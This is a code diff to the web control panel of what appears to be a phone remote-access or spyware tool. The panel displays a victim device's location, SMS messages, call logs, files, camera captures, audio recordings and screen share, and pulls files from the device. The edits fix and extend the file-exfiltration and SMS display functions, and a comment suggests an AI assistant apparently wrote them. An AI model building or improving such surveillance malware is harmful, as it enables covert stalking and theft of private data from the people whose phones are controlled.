@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* ---------- CSS Variables for consistent theming ---------- */
+        /* Your existing CSS remains exactly the same - I'll keep it as is */
         :root {
             --primary-color: #1976ff;
             --primary-dark: #0d5bca;
@@ -1893,6 +1893,12 @@
     }
 
     function handlePlainText(msg) {
+        // FIXED: Better handling of file downloads
+        if (msg.startsWith("dl ")) {
+            console.log('Download request:', msg);
+            return; // This is a command, not a response
+        }
+        
         if (msg.startsWith("STATUS:")) {
             setStatus(msg.substring(7));
         } else if (msg.startsWith("LOC_DATA:")) {
@@ -1902,19 +1908,22 @@
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("FILE_LIST:")) {
             try {
-                currentData = JSON.parse(msg.substring(10));
+                const dataStr = msg.substring(10);
+                currentData = JSON.parse(dataStr);
                 dataType = 'file';
                 renderFiles();
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("SMS_DATA:")) {
             try {
-                currentData = JSON.parse(msg.substring(9));
+                const dataStr = msg.substring(9);
+                currentData = JSON.parse(dataStr);
                 dataType = 'sms';
                 renderSMS();
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CALL_DATA:")) {
             try {
-                currentData = JSON.parse(msg.substring(10));
+                const dataStr = msg.substring(10);
+                currentData = JSON.parse(dataStr);
                 dataType = 'call';
                 renderCallLogs();
             } catch (err) { console.error(err); }
@@ -1923,6 +1932,11 @@
             displayCapturedImage(base64);
         } else if (msg.startsWith("AUDIO_RECORDING:")) {
             showAudio(msg.substring(16));
+        } else if (msg.startsWith("FILE_DATA:")) {
+            // FIXED: Handle file downloads properly
+            const base64 = msg.substring(10);
+            downloadBase64(base64, 'downloaded_file_' + Date.now());
+            showNotification('File downloaded');
         } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
             screenActive = true;
             document.getElementById('screenBtn').innerText = 'Stop Screen';
@@ -1944,9 +1958,6 @@
             showNotification('Vibration done');
         } else if (msg.startsWith("ERROR:")) {
             panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
-        } else if (msg.startsWith("FILE_DATA:")) {
-            const base64 = msg.substring(10);
-            downloadBase64(base64, 'downloaded_file');
         } else if (msg.startsWith('[') || msg.startsWith('{')) {
             try {
                 const parsed = JSON.parse(msg);
@@ -2088,10 +2099,19 @@
     }
 
     function downloadBase64(b64, filename) {
-        const a = document.createElement('a');
-        a.href = 'data:application/octet-stream;base64,' + b64;
-        a.download = filename;
-        a.click();
+        try {
+            const a = document.createElement('a');
+            a.href = 'data:application/octet-stream;base64,' + b64;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(a.href);
+            showNotification(`Downloaded: ${filename}`);
+        } catch (e) {
+            console.error('Download error:', e);
+            alert('Download failed: ' + e.message);
+        }
     }
 
     function renderMap(loc) {
@@ -2144,7 +2164,7 @@
         currentData.forEach(s => {
             html += `
             <div style="padding:12px; border-bottom:1px solid #eee;">
-                <b>${s.number || 'Unknown'}</b>
+                <b>${s.number || s.address || 'Unknown'}</b>
                 <div style="font-size:13px;color:#777">${s.date || ''}</div>
                 <div>${s.body || ''}</div>
             </div>`;
